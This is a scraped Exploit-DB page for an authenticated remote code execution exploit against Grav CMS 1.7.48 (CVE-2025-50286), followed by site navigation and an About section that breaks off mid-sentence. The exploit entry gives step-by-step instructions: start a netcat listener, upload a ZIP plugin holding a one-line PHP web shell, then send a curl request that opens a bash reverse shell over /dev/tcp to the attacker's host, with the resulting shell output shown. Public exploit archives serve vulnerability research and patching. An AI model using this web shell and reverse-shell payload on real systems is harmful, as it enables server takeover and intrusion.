---
title: [webapps] Grav CMS 1.7.48 - Remote Code Execution (RCE)
url: https://www.exploit-db.com/exploits/52402
source: Exploit-DB.com RSS Feed
date: 2025-08-12
fetch_date: 2025-10-07T00:48:07.704512
---

# [webapps] Grav CMS 1.7.48 - Remote Code Execution (RCE)

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Grav CMS 1.7.48 - Remote Code Execution (RCE)

#### EDB-ID:

###### 52402

#### CVE:

###### [2025-50286](https://nvd.nist.gov/vuln/detail/CVE-2025-50286)

---

**EDB Verified:**

#### Author:

###### [/bin/neko](/?author=12288)

#### Type:

###### [webapps](/?type=webapps)

---

#### Platform:

###### [PHP](/?platform=php)

#### Date:

###### 2025-08-11

---

**Vulnerable App:**

```
# Exploit Title: Grav CMS 1.7.48 - Remote Code Execution (RCE)
# Date: 2025-08-07
# Exploit Author: binneko (https://github.com/binneko)
# Vendor Homepage: https://getgrav.org/
# Software Link: https://github.com/getgrav/grav/releases/tag/1.7.48
# Version: Grav CMS v1.7.48 / Admin Plugin v1.10.48
# Tested on: Debian 11, Apache2, PHP 7.4
# CVE: CVE-2025-50286

# Description:
Grav CMS v1.7.48 with Admin Plugin v1.10.48 is vulnerable to Authenticated Remote Code Execution (RCE)
through the "Direct Install" feature in the admin panel. An authenticated administrator can upload
a malicious plugin that contains arbitrary PHP code, which will be executed by the server upon access.

# Steps to Reproduce:

1. Start a listener on your attack machine:
   nc -lvnp 4444

2. Log in to the Grav Admin Panel as an administrator:
   https://<target>/admin

3. Navigate to:
   Tools → Direct Install

4. Upload a ZIP archive containing the following structure:

   evilplugin/
   ├── evilplugin.php        # Contains: <?php shell_exec($_GET['cmd']); ?>
   └── blueprints.yaml       # Minimal content to pass plugin validation

5. Access the uploaded plugin’s endpoint and trigger the payload:

   curl --get --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/host.docker.internal/4444 0>&1'" http://<target>/

6. Observe the reverse shell:

   $ nc -lvnp 4444
   Listening on 0.0.0.0 4444
   Connection received on <target-ip>
   www-data@target:/var/www/html$ whoami
   www-data

# Notes:
- Authentication is required (admin-level).
- The vulnerability exists due to insufficient validation in the plugin upload feature (`/admin/tools/direct-install`).
- Successful exploitation may result in full system compromise.

# References:
- https://github.com/getgrav/grav
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-50286

# Disclaimer:
This exploit is provided for educational and research purposes only.
```

**Tags:**

**Advisory/Source:**
Link

| **Databases** | **Links** | **Sites** | **Solutions** |
| --- | --- | --- | --- |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/?utm_source=edb&utm_medium=web&utm_campaign=www) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/?utm_source=edb&utm_medium=web&utm_campaign=www) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/?utm_source=edb&utm_medium=web&utm_campaign=www) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www) |

Databases

[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links

[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites

[OffSec](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com/)

Solutions

[Courses and Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Learn Subscriptions](https://www.offsec.com/learn/?utm_source=edb&utm_medium=web&utm_campaign=www)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Proving Grounds](https://www.offsec.com/labs/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/?utm_source=edb&utm_medium=web&utm_campaign=www), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “do...